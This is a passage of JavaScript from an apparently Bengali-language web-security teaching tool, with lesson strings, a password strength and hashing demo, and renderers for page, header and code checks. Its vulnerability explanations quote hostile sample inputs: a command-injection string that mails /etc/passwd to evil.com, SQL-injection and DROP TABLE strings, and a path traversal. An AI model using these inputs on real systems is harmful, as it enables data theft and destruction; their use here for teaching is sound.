   urgency:["তাড়া দেওয়া কথা", d=>`লেখা আছে “${d.phrase}”। স্ক্যামাররা তাড়া দেয় যাতে আপনি না ভাবেন।`, "তাড়া দিচ্ছে। এটা স্ক্যামের চালাকি।", "Phishing"],
   form_no_csrf_token:["CSRF টোকেন ছাড়া ফর্ম", d=>`${d.action || "এই পেজে"} যাওয়া POST ফর্মে গোপন টোকেন নেই।`, "একটা ফর্মে সেফটি কোড নেই।", "CSRF"]
  },
  pageStats:{links:"লিংক", forms:"ফর্ম", images:"ছবি", iframes:"ফ্রেম"},
  hdrTitle:g=>`ওয়েবসাইটের সেফটি গ্রেড: ${g}`, hdrSub:{high:"জরুরি সুরক্ষা নেই।", verify:"ভালো শুরু। কয়েকটা ঠিক করা বাকি।", low:"সব জরুরি সুরক্ষা চালু আছে।"},
  hdrDos:{high:[["file","রিপোর্টটা ওয়েব ডেভেলপারকে পাঠান"],["shieldok","আগে লালগুলো ঠিক করুন"]], verify:[["file","রিপোর্টটা ডেভেলপারকে পাঠান"]], low:[["check","এভাবেই রাখুন"]]},
  hc:{hsts:["https বাধ্যতামূলক (HSTS)","Wi-Fi-র হামলাকারী যাতে ভিজিটরকে http-তে নামাতে না পারে।"], csp:["Content-Security-Policy","ঢুকিয়ে দেওয়া স্ক্রিপ্ট (XSS) চলতে দেয় না।"], clickjacking:["ফ্রেম সুরক্ষা","অন্য সাইট যেন আপনার পেজ অদৃশ্য ফ্রেমে লুকাতে না পারে (ক্লিকজ্যাকিং)।"], nosniff:["টাইপ আন্দাজ বন্ধ","ব্রাউজার যেন ফাইলকে কোড মনে না করে।"], referrer:["রেফারার পলিসি","ব্যক্তিগত পেজের ঠিকানা অন্য সাইটে ফাঁস হয় না।"], cors:["ক্রস-সাইট শেয়ারিং (CORS)","কোন সাইট আপনার ডেটা পড়তে পারবে তা ঠিক করে।"], version_leak:["ভার্সন লুকানো","হামলাকারী সঠিক ভার্সন দেখে বাগ খোঁজে।"], downgrade:["http-তে রিডাইরেক্ট নেই","http://-তে পাঠালে মাঝখানে বসা চোরের সুযোগ হয়।"], cookie:["কুকির সুরক্ষা","Secure, HttpOnly আর SameSite লগইন চুরি ও CSRF থেকে বাঁচায়।"]},
  ckIssue:{no_secure:"http-তেও যায়", no_httponly:"স্ক্রিপ্ট পড়তে পারে (XSS চুরি করতে পারে)", no_samesite:"SameSite নেই (CSRF ঝুঁকি)", samesite_none_insecure:"Secure ছাড়া SameSite=None", samesite_none:"সব ক্রস-সাইট রিকোয়েস্টে যায়", tld_domain:"ডোমেইন খুব বড়", long_lived:"অনেক দিন থাকে", bad_host_prefix:"__Host- ভুলভাবে ব্যবহার"},
  fixLbl:"সমাধান", okLbl:"ঠিক আছে", missLbl:"নেই / দুর্বল",
  codeTitle:n=>n ? `${n}টা ঝুঁকির লাইন পাওয়া গেছে` : "ঝুঁকির লাইন পাওয়া যায়নি", codeSub:{high:"হামলাকারী নিজের কমান্ড ঢুকিয়ে দিতে পারে।", verify:"কিছু লাইনে নিরাপদ উপায় দরকার।", low:"সাধারণ ইনজেকশন বা পাসওয়ার্ড রাখার ভুল পাওয়া যায়নি।"},
  codeDos:{high:[["code","আগে লাল লাইনগুলো ঠিক করুন"],["file","প্রতিটার পাশের “নিরাপদ উপায়” ব্যবহার করুন"]], verify:[["code","দেওয়া সমাধানগুলো লাগান"]], low:[["check","দারুণ! নিরাপদ API ব্যবহার চালিয়ে যান"]]},
  cr:{sql_concat:["SQL ইনজেকশন","ইউজারের লেখা SQL কোয়েরিতে জোড়া দেওয়া হয়েছে। ' OR '1'='1 দিলে সব সারি বেরিয়ে যাবে; '; DROP TABLE দিলে ডেটা মুছে যেতে পারে।"], sql_fstring:["SQL ইনজেকশন","f-string দিয়ে ইউজারের লেখা থেকে SQL বানানো হচ্ছে।"], cmd_injection:["কমান্ড ইনজেকশন","ইউজারের লেখা শেল কমান্ডে যাচ্ছে। '; mail mallory@evil.com < /etc/passwd'-ও চলে যাবে।"], xss_sink:["XSS (স্ক্রিপ্ট ইনজেকশন)","লেখা HTML হিসেবে পেজে বসানো হচ্ছে, তাই তাতে <script> থাকলে চলবে।"], xss_fprintf:["XSS (স্ক্রিপ্ট ইনজেকশন)","ইউজারের লেখা এস্কেপ ছাড়াই HTML-এ প্রিন্ট হচ্ছে।"], eval:["লেখা থেকে কোড","লেখাকে কোড হিসেবে চালানো হচ্ছে।"], path_traversal:["পাথ ট্রাভার্সাল","ইউজারের লেখা ফাইল বাছে; ../../etc/passwd দিয়ে গোপন ফাইল বের হতে পারে।"], weak_password_hash:["দুর্বলভাবে পাসওয়ার্ড রাখা","সল্ট ছাড়া দ্রুত হ্যাশ (MD5/SHA) GPU দিয়ে ভাঙা যায়।"], plain_password:["সরাসরি পাসওয়ার্ড রাখা","পাসওয়ার্ডটাই সেভ হচ্ছে।"], insecure_random:["আন্দাজযোগ্য র‍্যান্ডম","Math.random/rand অনুমান করা যায়; টোকেন আর সেশন আইডি নিরাপদ র‍্যান্ডম হতে হবে।"], cookie_flags:["সুরক্ষা ছাড়া কুকি","Secure / HttpOnly / SameSite নেই।"], cors_any:["সবার জন্য খোলা CORS","যেকোনো সাইট উত্তর পড়তে পারে।"], hardcoded_secret:["কোডে গোপন তথ্য","সোর্সে পাসওয়ার্ড বা কী লেখা আছে।"], form_no_csrf:["CSRF টোকেন ছাড়া ফর্ম","POST ফর্মে গোপন টোকেন নেই।"], http_url:["সাধারণ http ঠিকানা","পথেই ট্রাফিক পড়া বা বদলানো যায়।"], tls_off:["সার্টিফিকেট চেক বন্ধ","মাঝখানের যে কেউ সার্ভার সাজতে পারে।"]},
  lineLbl:"লাইন", linesLbl:"লাইন", safeWay:"নিরাপদ উপায়",
  labPh:{page:"ইমেইল বা পেজের সোর্স (HTML) এখানে পেস্ট করুন…", headers:"রেসপন্স হেডার এখানে পেস্ট করুন (যেমন: curl -I https://your-site.com থেকে)…", code:"কোড এখানে পেস্ট করুন (Go, Python, C, JavaScript, PHP, Java)…"},
  labGo:{page:"পেজের এক্স-রে", headers:"ওয়েবসাইট চেক করো", code:"কোড চেক করো"},
  labHelp:{page:"অথবা সেভ করা ইমেইল / পেজ দিন (.html, .eml, .txt)। কখনো খোলা বা চালানো হয় না।", headers:"ব্রাউজার → Developer tools → Network → পেজে চাপ দিন → Response headers → কপি।", code:"অথবা সোর্স ফাইল দিন। কিছুই চালানো হয় না।"},
  labEx:{page:[["phishEmail","ফিশিং ইমেইল"],["bitb","নকল গুগল জানালা"],["safeEmail","সাধারণ ইমেইল"]], headers:[["headersBad","দুর্বল ওয়েবসাইট"],["headersGood","ভালো সুরক্ষিত ওয়েবসাইট"]], code:[["codeBad","লেকচারের কোড (অনিরাপদ)"],["codeGood","ঠিক করা কোড"]]},
  labTabs:{page:["পেজ ও ইমেইল","লুকানো চালাকি খুঁজুন"], headers:["ওয়েবসাইট চেক","হেডার ও কুকির গ্রেড"], code:["কোড চেক","SQLi, XSS, কমান্ড বাগ"]},
  xt:{findings:"ফাইন্ডিং", tags:"ট্যাগ", text:"লেখা", checks:"চেক", hdrs:"হেডার", cookies:"কুকি", lines:"লাইন", math:"হিসাব", patterns:"প্যাটার্ন", hashlab:"হ্যাশিং ল্যাব", kanon:"k-anonymity", json:"JSON"},
  shTitle:"ব্রাউজার শিল্ড", shSub:"Chrome আর Edge-এর জন্য ফ্রি অ্যাড-অন। শুধু এখানে না, সব ওয়েবসাইটে আপনাকে পাহারা দেয়।",
  shFeat:[["key","নকল বা তালা ছাড়া পেজে পাসওয়ার্ড যাওয়ার আগেই থামায়, ১ সেকেন্ডের সেফটি বিরতিসহ।"],["frame","অদৃশ্য ফ্রেম আর নকল পয়েন্টার দেখিয়ে দেয় (ক্লিকজ্যাকিং)।"],["globe","যেসব পেজ গোপনে আপনার ব্যাংকে ফর্ম পাঠায় সেগুলো আটকায় (CSRF)।"],["link","লিংকে হামলার কোড (XSS, SQL ইনজেকশন) বা নকল ঠিকানা থাকলে সাবধান করে।"],["pixel","আপনাকে ট্র্যাক করা গোয়েন্দা পিক্সেল গোনে।"],["eye","সহজ আর এক্সপার্ট ভিউ, বাংলা ও ইংরেজি। কিছুই আপনার কম্পিউটারের বাইরে যায় না।"]],
  shGet:"ব্রাউজার শিল্ড ডাউনলোড করুন", shSteps:["ফাইলটা ডাউনলোড করে আনজিপ করুন।","chrome://extensions (বা edge://extensions) খুলুন।","Developer mode চালু করুন।","“Load unpacked”-এ চাপ দিয়ে আনজিপ করা ফোল্ডারটা বাছুন।"], shNote:"পরীক্ষার জন্য প্রোটোটাইপ। রিভিউয়ের পর Chrome Web Store-এ আনার পরিকল্পনা আছে।",
  lessons:{
   xss:["স্ক্রিপ্ট ইনজেকশন (XSS)", ["ওয়েবসাইট ইউজারের লেখা দেখায়। পরিষ্কার না করলে কমেন্টের <script> প্রত্যেক ভিজিটরের ব্রাউজারে চলে।", "সেই স্ক্রিপ্ট আপনার হয়ে কাজ করে: পেজ পড়ে, লগইন কুকি বাইরে পাঠায়।", "সাইট ঠিক করে লেখা এস্কেপ করে আর Content-Security-Policy দিয়ে। আপনি: আসল সাইটের অদ্ভুত কোডওয়ালা লিংক খুলবেন না।"], "codecheck"],
   sqli:["SQL ইনজেকশন", ["ওয়েবসাইট ডেটাবেসকে SQL-এ প্রশ্ন করে।", "সাইট আপনার লেখা প্রশ্নে জোড়া দিলে ' OR '1'='1 লিখে প্রশ্নটাই বদলে ফেলা যায়।", "সমাধান prepared statement: ডেটা সবসময় ডেটা, কখনো কমান্ড না।"], "codecheck"],
   cmdi:["কমান্ড ইনজেকশন", ["কিছু সার্ভার আপনার লেখা দিয়ে প্রোগ্রাম চালায়, যেমন grep 'আপনার লেখা'।", "একটা ; দিয়ে দ্বিতীয় খারাপ কমান্ড শুরু করা যায়।", "সমাধান: প্রোগ্রাম আর ডেটা আলাদা পাঠান (execv, লিস্টসহ subprocess.run)।"], "codecheck"],
   csrf:["ক্রস-সাইট রিকোয়েস্ট ফোর্জারি (CSRF)", ["লগইন করলে ব্রাউজার একটা কুকি রাখে আর নিজে থেকেই পাঠায়।", "খারাপ পেজ আপনার ব্রাউজার দিয়ে ব্যাংকে রিকোয়েস্ট পাঠাতে পারে, কুকিও চলে যায়।", "সাইট ঠিক করে গোপন CSRF টোকেন আর SameSite কুকি দিয়ে। ব্রাউজার শিল্ড লুকানো ফর্ম পাঠানো আটকায়।"], "mailxray"],
   clickjack:["ক্লিকজ্যাকিং", ["খারাপ পেজ আসল সাইটকে অদৃশ্য ফ্রেমে নকল বাটনের ওপর বসাতে পারে।", "আপনি ভাবেন “Play” চাপছেন, আসলে চাপছেন “Pay” বা “Allow”।", "সাইট ঠিক করে frame-ancestors দিয়ে; ব্রাউজার শিল্ড অদৃশ্য ফ্রেম দেখিয়ে দেয়।"], "shieldext"],
   cookies:["কুকি আর সেশন", ["লগইনের পর একটা কুকি (সেশন টোকেন) আপনার রিস্টব্যান্ড: দেখালেই ঢোকা যায়।", "কেউ চুরি করলে সে-ই আপনি, পাসওয়ার্ড লাগে না।", "ভালো সাইট এটাকে Secure, HttpOnly, SameSite করে আর মেয়াদ দেয়।"], "webcheck"],
   certs:["তালা আর সার্টিফিকেট", ["https একটা সার্টিফিকেট ব্যবহার করে: বিশ্বস্ত কোম্পানি সই করে “এই কী bkash.com-এর”।", "এটা নাম প্রমাণ করে, মালিক সৎ কি না না। নকল সাইটও তালা পেতে পারে।", "তাই আগে নাম দেখুন, তারপর তালা।"], "lockbar"],
   pwhash:["সাইটের পাসওয়ার্ড রাখার নিয়ম", ["ভালো সাইট আপনার পাসওয়ার্ড রাখে না। রাখে হ্যাশ: এলোমেলো একটা ফিঙ্গারপ্রিন্ট।", "প্রতি ইউজারের আলাদা সল্ট আর ধীর হ্যাশ (bcrypt, Argon2, PBKDF2) চুরি হওয়া লিস্ট ভাঙা খুব ধীর করে দেয়।", "তবু লম্বা, আলাদা পাসওয়ার্ড দিন: ৭টা এলোমেলো শব্দ দারুণ।"], "pwlock"],
   twofa:["টু-স্টেপ লগইন আর তার সীমা", ["টু-স্টেপ লগইনে লাগে আপনি যা জানেন আর আপনার কাছে যা আছে (ফোন বা কী)।", "নকল পেজ তবু আপনার SMS কোড চেয়ে সাথে সাথে ব্যবহার করতে পারে (রিলে অ্যাটাক)।", "সিকিউরিটি কী আর পাসকি আসল সাইটের নাম মিলায়, তাই ফিশিং থামায়।"], "pwlock"],
   bitb:["নকল লগইন জানালা", ["কিছু স্ক্যাম পেজ আসলের মতো ঠিকানাসহ পুরো একটা নকল ব্রাউজার জানালা আঁকে।", "আসল পপ-আপ পেজের বাইরে টানা যায়; নকলটা পেজ ছেড়ে যেতে পারে না।", "সন্দেহ হলে বন্ধ করে নিজে ঠিকানা লিখুন।"], "shieldext"],
   pixel:["গোয়েন্দা পিক্সেল", ["ইমেইলে ১×১ অদৃশ্য ছবি লুকানো থাকতে পারে।", "লোড হলেই পাঠানোকারী জানে আপনি কখন, কোথায়, কোন ডিভাইসে খুলেছেন।", "ইমেইল অ্যাপে অটো-ছবি বন্ধ করলে থামে।"], "mailxray"]
  },
  fileAsPage:"এই ফাইলটা একটা ওয়েব পেজ বা ইমেইল। এর এক্স-রে:"
 }
};
const ws = () => WS[LANG];
Object.assign(LV.en.lessons, WS.en.lessons); Object.assign(LV.bn.lessons, WS.bn.lessons);
Object.assign(LB.en.labTabs, WS.en.labTabs); Object.assign(LB.bn.labTabs, WS.bn.labTabs);
Object.assign(LB.en.xt, WS.en.xt); Object.assign(LB.bn.xt, WS.bn.xt);
const LAB_TABS = ["net", "logs", "page", "headers", "code"], LAB_TEXT_TABS = ["page", "headers", "code"];
const LAB_ICON = {net:"radar", logs:"server", page:"mail", headers:"globe", code:"code"};
let pwRes = null, pwGen = null, pwHibp = null, pwHash = null, pageRes = null, hdrRes = null, codeRes = null;
const plainWhy = (list) => `<div class="whys" style="padding:0">${list.join("")}</div>`;
const lchipsRow = ids => lessonChips(ids);

/* ---------- Password tab ---------- */
function applyPwStatic(){
  const W = ws();
  $("pwPic").innerHTML = ART.pwlock;
  $("pwLbl").innerHTML = `${esc(W.pwLbl)} <span class="qi" tabindex="0" ${tipS(W.pwTip)}>?</span>`;
  $("pwIn").placeholder = W.pwPh; $("pwEye").textContent = $("pwIn").type === "password" ? W.pwShow : W.pwHide;
  $("pwGo").innerHTML = `${ico("lock")} ${esc(W.pwGo)}`; $("pwMake").innerHTML = `${ico("wand","width:18px;height:18px")} ${esc(W.pwMake)}`;
  $("pwNote").innerHTML = `${ico("lock")}<span>${esc(W.pwNote)}</span>`;
  if (!$("pwGo").dataset.w){
    $("pwGo").dataset.w = "1";
    $("pwGo").addEventListener("click", runPw);
    $("pwIn").addEventListener("keydown", e => { if (e.key === "Enter") runPw(); });
    $("pwIn").addEventListener("input", pwMeter);
    $("pwEye").addEventListener("click", () => { const i = $("pwIn"); i.type = i.type === "password" ? "text" : "password"; $("pwEye").textContent = i.type === "password" ? ws().pwShow : ws().pwHide; });
    $("pwMake").addEventListener("click", () => { pwGen = makePassphrase(7); $("pwIn").value = pwGen.text; $("pwIn").type = "text"; $("pwEye").textContent = ws().pwHide; runPw(); });
  }
}
function pwMeter(){ const r = passwordCheck($("pwIn").value), m = $("pwMeter"); const pct = Math.min(100, r.bits / 70 * 100); m.style.setProperty("--w", pct + "%"); m.dataset.level = r.level; }
function runPw(){
  const v = $("pwIn").value; if (!v){ $("pwIn").focus(); return; }
  pwRes = passwordCheck(v.slice(0, 256)); pwHibp = null; pwHash = null;
  if (pwGen && pwGen.text !== v) pwGen = null;
  pwMeter();
  if (view !== "pass") setTab("pass"); else renderPw();
}
function pwReasons(r){
  const W = ws(), P = W.pat, IC = {common:"stop", word:"book", keyboard:"grid", repeat:"refresh", year:"calendar", phone:"phone", word_digits:"alert", personal:"user", digits_only:"alert"};
  const out = r.patterns.map(p => [IC[p.kind] || "alert", typeof P[p.kind] === "function" ? P[p.kind](p.detail) : P[p.kind]]);
  if (r.length < 10 && !r.patterns.some(p => p.kind === "common")) out.push(["alert", P.short]);
  return out;
}
function renderPw(){
  const W = ws(), el = $("result"), r = pwRes;
  if (!r){ el.innerHTML = `<div class="empty"><div style="max-width:230px;margin:0 auto 10px">${ART.pwlock}</div><h3 style="margin:0 0 4px;font:800 22px var(--disp)">${esc(W.pwEmpty[0])}</h3><p class="small" style="margin:0;font-size:15px">${esc(W.pwEmpty[1])}</p></div>`; emitRendered("pass"); return; }
  const lvl = getLevel(), v = r.verdict, t = humanTime(r.crack.offline_fast)[LANG === "bn" ? 1 : 0], reasons = pwReasons(r);
  const gen = pwGen ? `<div class="pwgen"><b>${esc(W.genT)}</b><code id="pwGenTxt">${esc(pwGen.text)}</code><span class="small">${esc(W.genB(pwGen.bits))}</span><button class="pill ghost sm" type="button" id="pwCopy">${ico("copy","width:16px;height:16px")} ${esc(W.genCopy)}</button></div>` : "";
  if (lvl === "simple"){
    el.innerHTML = simpleCard(v, reasons.slice(0, 2).concat([["clock", W.guessIn(t)]]), W.pwDos[r.level], {title:W.pwTitle[r.level], sub:W.pwSub[r.level]}) + gen;
    wireSimple(); wirePwGen(); emitRendered("pass"); return;
  }
  const tiles = Object.keys(W.crack).map(k => { const [a, b] = W.crack[k], tt = humanTime(r.crack[k])[LANG === "bn" ? 1 : 0], bad = r.crack[k] < 86400 * 30; return `<div class="crk ${bad ? "bad" : "ok"}" tabindex="0" ${tip(a, b)}><span class="ci">${ico({online_limited:"lock", online:"globe", offline_slow:"clock", offline_fast:"activity"}[k])}</span><small>${esc(a)}</small><b>${esc(tt)}</b></div>`; }).join("");
  const ladder = `<div class="tfa">${W.twofa.map((s, i) => `<div class="tfs s${i}" tabindex="0" ${tip(s[1], s[2])}><span>${ico(s[0])}</span><b>${esc(s[1])}</b><small>${esc(s[2])}</small></div>`).join(`<span class="tfarr">${ico("arrow","width:18px;height:18px")}</span>`)}</div>`;
  const hibp = `<div class="ocard" id="pwHibpBox"><h4>${ico("search","width:18px;height:18px")} ${esc(W.hibpT)}</h4><p class="small" style="margin:0 0 8px">${esc(W.hibpB)}</p>${pwHibp === "consent" ? `<p style="margin:0 0 8px;font-weight:700">${esc(W.hibpConsent)}</p><div class="bar" style="padding:0"><button class="pill sky sm" type="button" id="pwHibpYes">${esc(W.hibpYes)}</button><button class="pill ghost sm" type="button" id="pwHibpNo">${esc(W.hibpNo)}</button></div>` : pwHibp && pwHibp.status === "complete" ? `<p style="margin:0;font-weight:800;color:${pwHibp.count ? "var(--high)" : "var(--low)"}">${esc(W.hibpRes(pwHibp.count))}</p>` : pwHibp && pwHibp.status ? `<p style="margin:0">${esc(W.hibpOff)}</p>` : pwHibp === "loading" ? `<p>…</p>` : `<button class="pill ghost sm" type="button" id="pwHibpGo">${esc(W.hibpGo)}</button>`}</div>`;
  el.innerHTML = `${vhead(v, W.pwTitle[r.level], W.pwSub[r.level], `<span class="when">${ico("lock","width:15px;height:15px")}${r.length} · ${r.bits} bits</span>`)}
    <div class="pwbar"><div class="pwmeter big" data-level="${r.level}" style="--w:${Math.min(100, r.bits / 70 * 100)}%"><i></i></div></div>
    ${reasons.length ? `<div class="whys v-${v}">${reasons.map(x => `<div class="why"><span class="wi">${ico(x[0])}</span><span>${esc(x[1])}</span></div>`).join("")}</div>` : ""}
    <div class="lsec"><h4>${esc(W.crackT)}</h4><div class="crks">${tiles}</div></div>
    ${gen ? `<div class="lsec">${gen}</div>` : ""}
    <div class="lsec"><h4>${esc(W.twofaT)}</h4>${ladder}</div>
    <div class="lsec">${hibp}</div>
    <div class="dos">${W.pwDos[r.level].map(d => `<div class="do"><span class="di">${ico(d[0])}</span><b style="font-weight:700">${esc(d[1])}</b></div>`).join("")}</div>
    <div class="extras">${lessonChips(["pwhash","twofa","cookies"])}${lvl === "expert" ? pwConsole(r) : ""}</div>`;
  el.querySelectorAll("[data-lesson]").forEach(b => b.addEventListener("click", () => openLesson(b.dataset.lesson, ["pwhash","twofa","cookies"])));
  const g = $("pwHibpGo"); if (g) g.addEventListener("click", () => { pwHibp = "consent"; renderPw(); });
  const n = $("pwHibpNo"); if (n) n.addEventListener("click", () => { pwHibp = null; renderPw(); });
  const y = $("pwHibpYes"); if (y) y.addEventListener("click", async () => { pwHibp = "loading"; renderPw(); pwHibp = await pwnedCheck($("pwIn").value); renderPw(); });
  wirePwGen();
  if (lvl === "expert"){ wireConsole("pass", "px"); const hb = $("pwHashRun"); if (hb) hb.addEventListener("click", runHashLab); }
  emitRendered("pass");
}
function wirePwGen(){ const c = $("pwCopy"); if (c) c.addEventListener("click", () => copyText($("pwGenTxt").textContent, lv().copied, $("pwGenTxt"))); }
async function runHashLab(){
  const pw = $("pwIn").value, enc = new TextEncoder(), hex = b => Array.from(new Uint8Array(b)).map(x => x.toString(16).padStart(2, "0")).join("");
  const salt = crypto.getRandomValues(new Uint8Array(16));
  const uns = hex(await crypto.subtle.digest("SHA-256", enc.encode(pw)));
  const salted = hex(await crypto.subtle.digest("SHA-256", new Uint8Array([...salt, ...enc.encode(pw)])));
  const t0 = performance.now(), key = await crypto.subtle.importKey("raw", enc.encode(pw), "PBKDF2", false, ["deriveBits"]);
  const slow = hex(await crypto.subtle.deriveBits({name:"PBKDF2", hash:"SHA-256", salt, iterations:100000}, key, 256)), ms = Math.max(1, Math.round(performance.now() - t0));
  pwHash = {salt:hex(salt), uns, salted, slow, ms}; renderPw();
}
function pwConsole(r){
  const W = ws(), h = lv().xh;
  const math = xTable([h.field, h.value], [["length", String(r.length)], ["character pool", String(r.pool)], ["bits ≈ length × log2(pool) − pattern penalties", String(r.bits)], ["guesses ≈ 2^bits", r.bits > 60 ? "2^" + r.bits : Math.round(Math.pow(2, r.bits)).toLocaleString()]].concat(Object.entries(r.speeds).map(([k, s]) => ["time @ " + s + " guesses/s (" + k + ")", esc(humanTime(r.crack[k])[0])])));
  const pats = xTable([h.kind, h.finding], r.patterns.map(p => [mono(p.kind), esc(p.detail || "–")]));
  const hl = pwHash ? xTable([h.method, h.value], [["salt (random, public)", mono(pwHash.salt)], [W.hashUns, mono(pwHash.uns.slice(0, 32) + "…")], [W.hashSalt, mono(pwHash.salted.slice(0, 32) + "…")], [W.hashSlow, mono(pwHash.slow.slice(0, 32) + "…")], ["time", esc(W.hashTime(pwHash.ms))]]) : `<p class="xnote">${esc(W.hashIntro)}</p><button class="xcopy" type="button" id="pwHashRun" style="margin-top:4px">${esc(W.hashRun)}</button>`;
  const kan = `<p class="xnote" id="pwKanon">${esc(W.hibpB)}</p>`;
  const json = JSON.stringify({length:r.length, pool:r.pool, bits:r.bits, level:r.level, patterns:r.patterns, crackSeconds:r.crack, breachCheck:pwHibp && pwHibp.status ? {status:pwHibp.status, prefixSent:pwHibp.prefix, count:pwHibp.count} : null}, null, 2);
  setTimeout(async () => { const k = $("pwKanon"); if (k && $("pwIn").value){ const s = await sha1Hex($("pwIn").value); k.textContent = W.kanon(s.slice(0, 5), s.slice(5, 12)); } }, 0);
  return xConsole("pass", ["math","patterns","hashlab","kanon","json"], {math, patterns:pats, hashlab:hl, kanon:kan, json:`<pre class="xpre">${esc(json)}</pre>`}, json, "px");
}

/* ---------- Page & email X-ray (used by the File tab and the Lab) ---------- */
const PF_ICON = {tracking_pixel:"pixel", csrf_img:"taka", hidden_iframe:"frame", tiny_iframe:"frame", cursor_hidden:"cursor", form_http:"lock", form_foreign:"key", auto_submit_form:"refresh", link_mismatch:"eyeoff", bad_link:"link", payload_link:"code", js_link:"code", event_handlers:"code", script_in_content:"code", meta_redirect:"arrow", browser_in_browser:"window", urgency:"alert", form_no_csrf_token:"key"};
const PF_LESSON = {tracking_pixel:"pixel", csrf_img:"csrf", auto_submit_form:"csrf", form_no_csrf_token:"csrf", hidden_iframe:"clickjack", tiny_iframe:"clickjack", cursor_hidden:"clickjack", browser_in_browser:"bitb", payload_link:"xss", js_link:"xss", event_handlers:"xss", script_in_content:"xss", form_http:"https", link_mismatch:"domain", bad_link:"lookalike", form_foreign:"domain"};
function renderPageXray(el, r, name, kind, idp){
  const W = ws(), P = W.pf, lvl = getLevel(), v = r.verdict;
  const ids = [...new Set(r.findings.map(f => PF_LESSON[f.kind]).filter(Boolean))].slice(0, 4); if (!ids.length) ids.push("xss", "csrf");
  if (lvl === "simple"){
    const reasons = r.findings.slice(0, 3).map(f => [PF_ICON[f.kind] || "alert", typeof P[f.kind][2] === "function" ? P[f.kind][2](f.data) : P[f.kind][2]]);
    el.innerHTML = simpleCard(v, reasons, W.pageDos[v], {title:W.pageTitle[v], sub:W.pageSub[v], tag:`<span class="when">${ico("mail","width:15px;height:15px")}${esc(name)}</span>`});
    el.querySelectorAll("[data-lvgo]").forEach(b => b.addEventListener("click", () => setLevel(b.dataset.lvgo)));
    return;
  }
  const list = r.findings.length ? `<div class="whys v-${v}" style="padding:0">${r.findings.map(f => `<div class="why lf s-${f.sev}"><span class="wi">${ico(PF_ICON[f.kind] || "alert")}</span><span><b>${esc(P[f.kind][0])}</b><br><span class="lft">${esc(P[f.kind][1](f.data))}</span></span><small tabindex="0" ${tip(P[f.kind][3], f.cwe)}>${esc(P[f.kind][3])}${f.cwe ? " · " + esc(f.cwe) : ""}</small></div>`).join("")}</div>` : `<p class="lnone">${ico("check")} ${esc(W.pageTitle.low)}</p>`;
  const st = W.pageStats;
  el.innerHTML = `${vhead(v, W.pageTitle[v], W.pageSub[v], `<span class="when">${ico("mail","width:15px;height:15px")}${esc(name)}</span>`)}
    ${statTiles([[num(r.stats.links), st.links], [num(r.stats.forms), st.forms], [num(r.stats.images), st.images], [num(r.stats.iframes), st.iframes]])}
    <div class="lsec">${list}</div>
    <div class="dos">${W.pageDos[v].map(d => `<div class="do"><span class="di">${ico(d[0])}</span><b style="font-weight:700">${esc(d[1])}</b></div>`).join("")}</div>
    <div class="extras">${lessonChips(ids)}${lvl === "expert" ? pageConsole(r, idp || "wx") : ""}</div>`;
  el.querySelectorAll("[data-lesson]").forEach(b => b.addEventListener("click", () => openLesson(b.dataset.lesson, ids)));
  if (lvl === "expert") wireConsole("page", idp || "wx");
}
function pageConsole(r, idp){
  const h = lv().xh, L = lb().xh;
  const findings = xTable([L.id, L.sev, "CWE", L.data], r.findings.map(f => [mono(f.kind), `<span class="xv x-${f.sev === "high" ? "high" : f.sev === "medium" ? "verify" : "low"}">${f.sev}</span>`, mono(f.cwe || "–"), esc(JSON.stringify(f.data).slice(0, 200))]));
  const tags = xTable([h.field, h.value], Object.entries(r.stats).map(([k, n]) => [mono(k), String(n)]).concat(r.brand ? [["brand named in text", esc(r.brand)]] : []));
  const json = JSON.stringify(r, null, 2);
  return xConsole("page", ["findings","tags","text","json"], {findings, tags, text:`<pre class="xpre">${esc(r.textPreview)}</pre>`, json:`<pre class="xpre">${esc(json)}</pre>`}, json, idp);
}

/* ---------- Website headers & cookies ---------- */
function renderHeaders(el, r){
  const W = ws(), lvl = getLevel(), v = r.verdict, HC = W.hc;
  const fails = r.checks.filter(c => !c.ok);
  if (lvl === "simple"){
    const reasons = fails.slice(0, 3).map(c => ["alert", (HC[c.id] || [c.id])[0] + ": " + (HC[c.id] || ["", ""])[1]]);
    el.innerHTML = simpleCard(v, reasons, W.hdrDos[v], {title:W.hdrTitle(r.grade), sub:W.hdrSub[v]});
    el.querySelectorAll("[data-lvgo]").forEach(b => b.addEventListener("click", () => setLevel(b.dataset.lvgo)));
    return;
  }
  const rows = r.checks.filter(c => c.id !== "cookie").map(c => `<div class="hck ${c.ok ? "ok" : "bad s-" + c.sev}"><span class="hi">${ico(c.ok ? "check" : "x")}</span><div><b>${esc((HC[c.id] || [c.id])[0])}</b><small>${esc((HC[c.id] || ["", ""])[1])}</small>${!c.ok ? `<code>${esc(W.fixLbl)}: ${esc(c.fix)}</code>` : `<span class="small">${esc(c.detail.slice(0, 90))}</span>`}</div><span class="cwe">${esc(c.cwe)}</span></div>`).join("");
  const ck = r.cookies.map(c => `<div class="ckc ${c.issues.length ? "bad" : "ok"}"><span class="hi">${ico("cookie")}</span><div><b>${esc(c.name)}</b><small>SameSite: ${esc(c.sameSite)} · Secure: ${c.secure ? "✓" : "✗"} · HttpOnly: ${c.httpOnly ? "✓" : "✗"}</small>${c.issues.length ? `<span class="small" style="color:var(--high)">${esc(c.issues.map(i => W.ckIssue[i] || i).join(" · "))}</span>` : ""}</div></div>`).join("");
  el.innerHTML = `${vhead(v, W.hdrTitle(r.grade), W.hdrSub[v], `<span class="when">${ico("globe","width:15px;height:15px")}${r.score}/100</span>`)}
    <div class="lsec"><div class="gradebox"><span class="grade g-${r.grade}">${r.grade}</span><div class="hcks">${rows}</div></div></div>
    ${ck ? `<div class="lsec"><h4>${esc(HC.cookie[0])}</h4><div class="ckcs">${ck}</div></div>` : ""}
    <div class="dos">${W.hdrDos[v].map(d => `<div class="do"><span class="di">${ico(d[0])}</span><b style="font-weight:700">${esc(d[1])}</b></div>`).join("")}</div>
    <div class="extras">${lessonChips(["cookies","csrf","clickjack","xss","certs"])}${lvl === "expert" ? hdrConsole(r) : ""}</div>`;
  el.querySelectorAll("[data-lesson]").forEach(b => b.addEventListener("click", () => openLesson(b.dataset.lesson, ["cookies","csrf","clickjack","xss","certs"])));
  if (lvl === "expert") wireConsole("headers", "lx");
}
function hdrConsole(r){
  const L = lb().xh, h = lv().xh;
  const checks = xTable(["check", "ok", L.sev, "CWE", L.data, ws().fixLbl], r.checks.map(c => [mono(c.id), c.ok ? `<span class="xv x-low">✓</span>` : `<span class="xv x-high">✗</span>`, esc(c.sev), mono(c.cwe), esc(c.detail.slice(0, 100)), mono(c.fix)]));
